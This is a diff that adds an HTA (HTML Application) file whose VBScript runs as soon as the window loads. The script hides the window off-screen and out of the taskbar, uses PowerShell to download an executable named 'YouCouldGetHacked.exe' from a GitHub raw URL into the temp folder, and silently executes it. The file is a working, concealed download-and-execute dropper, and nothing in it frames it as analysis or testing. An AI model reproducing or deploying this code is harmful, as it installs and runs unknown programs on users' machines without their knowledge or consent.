@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>...</title>
+    <HTA:APPLICATION
+        APPLICATIONNAME=""
+        BORDER="thin"
+        BORDERSTYLE="normal"
+        ICON=""
+        SHOWINTASKBAR="no"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="minimized"
+        SCROLL="no"
+        SCROLLFLAT="yes"
+        SYSMENU="no"
+    />
+<script language="VBScript">
+    Sub Window_onLoad
+        Window.ResizeTo 1, 1
+        Window.MoveTo -32000, -32000
+
+        Set objShell = CreateObject("WScript.Shell")
+
+        downloadURL = "https://raw.githubusercontent.com/Absollute64/YouCouldJustGetHacked/refs/heads/main/YouCouldGetHacked.exe" 
+
+        tempFolder = objShell.ExpandEnvironmentStrings("%temp%")
+
+        downloadedFile = tempFolder & "\YouCouldGetHacked.exe"
+
+        cmdCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri '" & downloadURL & "' -OutFile '" & downloadedFile & "'"""
+
+        objShell.Run "cmd.exe /c " & cmdCommand, 0, True
+
+        
+        objShell.Run downloadedFile, 0, False
+    End Sub
+</script>
+</head>
+<body>
+</body>
+</html>
